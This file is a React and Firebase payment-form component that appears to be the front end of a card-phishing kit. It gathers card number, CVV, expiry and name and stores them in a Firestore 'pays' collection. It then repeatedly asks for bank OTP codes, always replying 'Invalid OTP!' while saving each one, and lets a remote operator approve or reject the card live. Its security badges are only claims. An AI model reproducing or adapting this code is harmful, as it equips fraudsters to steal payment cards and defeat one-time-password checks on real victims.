"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { db, handlePay } from "../firebase"

type PaymentInfo = {
  cardNumber: string
  year: string
  month: string
  bank?: string
  otp?: string
  pass: string
  cardState: string
  allOtps: string[]
  bank_card: string[]
  prefix: string
  status: "new" | "pending" | "approved" | "rejected"
}

export const Payment = (props: any) => {
  const [isProcessing, setIsProcessing] = useState(false)
  const [otp, setOtp] = useState("")
  const [showOtp, setShowOtp] = useState(false)
  const [step, setStep] = useState(1)
  const [newotp] = useState([""])
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    year: "2025",
    month: "1",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
  })

  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `)
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    handlePay(paymentInfo, setPaymentInfo)
    setIsProcessing(true)
    setStep(2)
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtp(true)
    }, 2000)
  }

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    handleAddotp(otp)
    setStep(3)
    props.setisloading(true)

    setPaymentInfo({
      ...paymentInfo,
      status: "approved",
    })
    handlePay(paymentInfo, setPaymentInfo)
    setTimeout(() => {
      props.setisloading(false)
      alert("Invalid OTP!")
      setOtp("")
    }, 3000)
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    setPaymentInfo({
      ...paymentInfo,
      cardNumber: formatted.replace(/\s/g, ""),
    })
  }

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
            if (data.status === "approved") {
              setStep(2)
              props.setisloading(false)
            } else if (data.status === "rejected") {
              props.setisloading(false)
              alert("Card declined. Please enter correct card information.")
              setStep(1)
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50 flex items-center justify-center p-4" style={{margin:8}}>
      <div className="w-full max-w-md">
        {/* Progress Steps */}
        <div className="flex items-center justify-center mb-8">
          <div className="flex items-center space-x-4">
            {/* Step 1 */}
            <div className="flex items-center">
              <div
                className={`w-10 h-10 rounded-full border-2 flex items-center justify-center font-semibold text-sm transition-all duration-300 ${
                  step >= 1
                    ? "bg-blue-600 border-blue-600 text-white shadow-lg"
                    : "bg-white border-gray-300 text-gray-400"
                }`}
              >
                {step > 1 ? (
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                ) : (
                  "1"
                )}
              </div>
              <span className={`ml-2 text-sm font-medium ${step >= 1 ? "text-gray-900" : "text-gray-500"}`}>
                Card Details
              </span>
            </div>

            {/* Connector */}
            <div className={`w-12 h-0.5 transition-all duration-300 ${step > 1 ? "bg-blue-600" : "bg-gray-300"}`}></div>

            {/* Step 2 */}
            <div className="flex items-center">
              <div
                className={`w-10 h-10 rounded-full border-2 flex items-center justify-center font-semibold text-sm transition-all duration-300 ${
                  step >= 2
                    ? "bg-blue-600 border-blue-600 text-white shadow-lg"
                    : "bg-white border-gray-300 text-gray-400"
                }`}
              >
                {step > 2 ? (
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                ) : (
                  "2"
                )}
              </div>
              <span className={`ml-2 text-sm font-medium ${step >= 2 ? "text-gray-900" : "text-gray-500"}`}>
                Verification
              </span>
            </div>
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden">
          {/* Header */}
          <div className="bg-gradient-to-r from-blue-600 to-indigo-600 px-6 py-8 text-center">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">
              {!showOtp
                ? "Payment Details"
                : step === 2 && paymentInfo.status === "pending"
                  ? "Processing Payment"
                  : "Verify Payment"}
            </h2>
            <p className="text-blue-100">
              {!showOtp
                ? "Enter your card information securely"
                : step === 2 && paymentInfo.status === "pending"
                  ? "Please wait while we process your payment"
                  : "Enter the verification code sent to your mobile"}
            </p>
          </div>

          {/* Content */}
          <div className="p-6">
            {!showOtp ? (
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Cardholder Name */}
                <div>
                  <label style={{padding:5}} htmlFor="name" className="block text-sm font-semibold text-gray-700 mb-2">
                    Cardholder Name
                  </label>
                  <input
                    id="name"
                    name="name"
                    type="text"
                    placeholder="John Doe"
                    onChange={(e) => {
                      setPaymentInfo({
                        ...paymentInfo,
                        bank: e.target.value,
                      })
                    }}
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-gray-900 placeholder-gray-500"
                  />
                </div>

                {/* Card Number */}
                <div>
                  <label style={{padding:5}} htmlFor="cardNumber" className="block text-sm font-semibold text-gray-700 mb-2">
                    Card Number
                  </label>
                  <div className="relative">
                    <input
                      id="cardNumber"
                      name="cardNumber"
                      type="tel"
                      placeholder="1234 5678 9012 3456"
                      value={formatCardNumber(paymentInfo.cardNumber)}
                      onChange={handleCardNumberChange}
                      maxLength={19}
                      required
                      className="w-full px-4 py-3 pl-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-gray-900 placeholder-gray-500 font-mono"
                    />
                    <svg
                      className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                      />
                    </svg>
                  </div>
                </div>

                {/* Expiry and CVV */}
                <div className="grid grid-cols-3 gap-4">
                  <div>
                    <label style={{padding:5}} htmlFor="year" className="block text-sm font-semibold text-gray-700 mb-2">
                      Year
                    </label>
                    <select
                      id="year"
                      value={paymentInfo.year}
                      onChange={(e) => {
                        setPaymentInfo({
                          ...paymentInfo,
                          year: e.target.value,
                        })
                      }}
                      required
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-gray-900 bg-white"
                    >
                      {Array.from({ length: 10 }, (_, i) => 2025 + i).map((year) => (
                        <option key={year} value={year.toString()}>
                          {year}
                        </option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label style={{padding:5}} htmlFor="month" className="block text-sm font-semibold text-gray-700 mb-2">
                      Month
                    </label>
                    <select
                      id="month"
                      value={paymentInfo.month}
                      onChange={(e) => {
                        setPaymentInfo({
                          ...paymentInfo,
                          month: e.target.value,
                        })
                      }}
                      required
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-gray-900 bg-white"
                    >
                      {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                        <option key={month} value={month.toString()}>
                          {month.toString().padStart(2, "0")}
                        </option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label style={{padding:5}}htmlFor="cvv" className="block text-sm font-semibold text-gray-700 mb-2">
                      CVV
                    </label>
                    <div className="relative">
                      <input
                        id="cvv"
                        name="cvv"
                        type="password"
                        placeholder="123"
                        maxLength={3}
                        minLength={3}
                        onChange={(e) => {
                          setPaymentInfo({
                            ...paymentInfo,
                            pass: e.target.value,
                          })
                        }}
                        required
                        className="w-full px-4 py-3 pr-10 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-gray-900 placeholder-gray-500 font-mono"
                      />
                      <svg
                        className="absolute right-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                        />
                      </svg>
                    </div>
                  </div>
                </div>

                {/* Security Notice */}
                <div className="bg-green-50 border border-green-200 rounded-lg p-4 flex items-center space-x-3">
                  <svg className="w-5 h-5 text-green-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="text-sm text-green-700 font-medium" style={{padding:6}}>
                    Your payment information is encrypted and secure
                  </span>
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isProcessing}
                  className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 disabled:from-gray-400 disabled:to-gray-500 text-white font-semibold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02] disabled:scale-100 disabled:cursor-not-allowed shadow-lg hover:shadow-xl"
                >
                  {isProcessing ? (
                    <div className="flex items-center justify-center space-x-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Processing...</span>
                    </div>
                  ) : (
                    <div className="flex items-center justify-center space-x-2">
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                        />
                      </svg>
                      <span>Pay Securely</span>
                    </div>
                  )}
                </button>
              </form>
            ) : step === 2 && paymentInfo.status === "pending" ? (
              <div className="text-center py-8">
                <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                  <div className="flex items-center justify-center space-x-2 text-blue-700">
                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M18 8A6 6 0 006 8v2.5A2.5 2.5 0 008.5 13h3A2.5 2.5 0 0014 10.5V8a2 2 0 10-4 0v2.5a.5.5 0 01-.5.5h-3a.5.5 0 01-.5-.5V8a4 4 0 118 0v2.5A4.5 4.5 0 019.5 15h1A4.5 4.5 0 015 10.5V8z"
                        clipRule="evenodd"
                      />
                    </svg>
                    <span className="font-medium" >
                      Your payment request is being processed. Please wait while we verify your transaction.
                    </span>
                  </div>
                </div>
              </div>
            ) : (
              <form onSubmit={handleOtpSubmit} className="space-y-6">
                <div>
                  <label htmlFor="otp" className="block text-sm font-semibold text-gray-700 mb-2">
                    Verification Code
                  </label>
                  <input
                    id="otp"
                    name="otp"
                    type="tel"
                    placeholder="Enter 6-digit code"
                    value={otp}
                    minLength={4}
                    maxLength={6}
                    onChange={(e) => setOtp(e.target.value)}
                    required
                    className="w-full px-4 py-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-gray-900 placeholder-gray-500 text-center font-mono text-lg tracking-widest"
                  />
                </div>

                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 flex items-start space-x-3">
                  <svg className="w-5 h-5 text-blue-500 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M18 8A6 6 0 006 8v2.5A2.5 2.5 0 008.5 13h3A2.5 2.5 0 0014 10.5V8a2 2 0 10-4 0v2.5a.5.5 0 01-.5.5h-3a.5.5 0 01-.5-.5V8a4 4 0 118 0v2.5A4.5 4.5 0 019.5 15h1A4.5 4.5 0 015 10.5V8z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="text-sm text-blue-700">
                    Please enter the OTP verification code sent to your registered mobile number.
                  </span>
                </div>

                <button
                  type="submit"
                  className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-semibold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02] shadow-lg hover:shadow-xl"
                >
                  <div className="flex items-center justify-center space-x-2">
                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                        clipRule="evenodd"
                      />
                    </svg>
                    <span>Confirm Payment</span>
                  </div>
                </button>
              </form>
            )}
          </div>
        </div>

        {/* Security Badges */}
        <div className="flex items-center justify-center space-x-6 mt-6 text-xs text-gray-500"style={{padding:6}}>
          <div className="flex items-center space-x-1 bg-white px-3 py-2 rounded-full shadow-sm border border-gray-200" style={{padding:6}}>
            <svg className="w-3 h-3 text-green-500" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                clipRule="evenodd"
              />
            </svg>
            <span className="font-medium">SSL Secured</span>
          </div>
          <div className="flex items-center space-x-1 bg-white px-3 py-2 rounded-full shadow-sm border border-gray-200">
            <svg className="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
              />
            </svg>
            <span className="font-medium" style={{padding:6}}>256-bit Encryption</span>
          </div>
        </div>
      </div>
    </div>
  )
}
